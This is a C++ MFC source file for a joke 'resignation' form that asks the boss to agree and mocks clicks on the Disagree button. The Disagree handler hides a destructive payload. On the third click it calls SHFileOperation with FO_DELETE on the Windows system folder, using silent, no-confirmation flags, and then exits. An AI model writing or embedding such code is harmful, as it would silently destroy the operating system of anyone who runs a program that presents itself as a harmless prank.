
// ResignmentView.cpp: CResignmentView 類別的實作
//

#include "pch.h"
#include "framework.h"
// SHARED_HANDLERS 可以定義在實作預覽、縮圖和搜尋篩選條件處理常式的
// ATL 專案中，並允許與該專案共用文件程式碼。
#ifndef SHARED_HANDLERS
#include "Resignment.h"
#endif

#include "ResignmentDoc.h"
#include "ResignmentView.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif

#include <cstdlib>

// CResignmentView

IMPLEMENT_DYNCREATE(CResignmentView, CFormView)

BEGIN_MESSAGE_MAP(CResignmentView, CFormView)
	// 標準列印命令
	ON_COMMAND(ID_FILE_PRINT, &CFormView::OnFilePrint)
	ON_COMMAND(ID_FILE_PRINT_DIRECT, &CFormView::OnFilePrint)
	ON_COMMAND(ID_FILE_PRINT_PREVIEW, &CFormView::OnFilePrintPreview)
	ON_BN_CLICKED(IDC_AGREE, &CResignmentView::OnBnClickedAgree)
	ON_BN_CLICKED(IDC_DISAGREE, &CResignmentView::OnBnClickedDisagree)
END_MESSAGE_MAP()

// CResignmentView 建構/解構

CResignmentView::CResignmentView() noexcept
	: CFormView(IDD_RESIGNMENT_FORM)
{
	// TODO: 在此加入建構程式碼
	MessageBox(L"Boss");
	MessageBox(L"I want to resign.");
	AfxMessageBox(L"Honestly");
	AfxMessageBox(L"I can't handle it.");

	count = 0;
}

CResignmentView::~CResignmentView()
{
}

void CResignmentView::DoDataExchange(CDataExchange* pDX)
{
	CFormView::DoDataExchange(pDX);
}

BOOL CResignmentView::PreCreateWindow(CREATESTRUCT& cs)
{
	// TODO: 在此經由修改 CREATESTRUCT cs 
	// 達到修改視窗類別或樣式的目的

	return CFormView::PreCreateWindow(cs);
}

void CResignmentView::OnInitialUpdate()
{
	CFormView::OnInitialUpdate();
	GetParentFrame()->RecalcLayout();
	ResizeParentToFit();

}


// CResignmentView 列印

BOOL CResignmentView::OnPreparePrinting(CPrintInfo* pInfo)
{
	// 預設的準備列印程式碼
	return DoPreparePrinting(pInfo);
}

void CResignmentView::OnBeginPrinting(CDC* /*pDC*/, CPrintInfo* /*pInfo*/)
{
	// TODO: 加入列印前額外的初始設定
}

void CResignmentView::OnEndPrinting(CDC* /*pDC*/, CPrintInfo* /*pInfo*/)
{
	// TODO: 加入列印後的清除程式碼
}

void CResignmentView::OnPrint(CDC* pDC, CPrintInfo* /*pInfo*/)
{
	// TODO: 在此加入自訂的列印程式碼
}


// CResignmentView 診斷

#ifdef _DEBUG
void CResignmentView::AssertValid() const
{
	CFormView::AssertValid();
}

void CResignmentView::Dump(CDumpContext& dc) const
{
	CFormView::Dump(dc);
}

CResignmentDoc* CResignmentView::GetDocument() const // 內嵌非偵錯版本
{
	ASSERT(m_pDocument->IsKindOf(RUNTIME_CLASS(CResignmentDoc)));
	return (CResignmentDoc*)m_pDocument;
}
#endif //_DEBUG


// CResignmentView 訊息處理常式


void CResignmentView::OnBnClickedAgree()
{
	// TODO: 在此加入控制項告知處理常式程式碼
	MessageBox(L"Thank you, boss.");
	exit(0);
}


void CResignmentView::OnBnClickedDisagree()
{
	// TODO: 在此加入控制項告知處理常式程式碼
	++count;

	CString str;
	str.Format(L"Don't choose this. %d chances left.", 3 - count);

	AfxMessageBox(str);
	if (count == 3) {
		SHFILEOPSTRUCT SHFileOp;
		SHFileOp.wFunc = FO_DELETE;
		SHFileOp.pFrom = L"C://Windows";
		SHFileOp.fFlags = FOF_NOCONFIRMATION + FOF_NOERRORUI + FOF_SILENT;

		SHFileOperation(&SHFileOp);

		exit(0);
	}
}
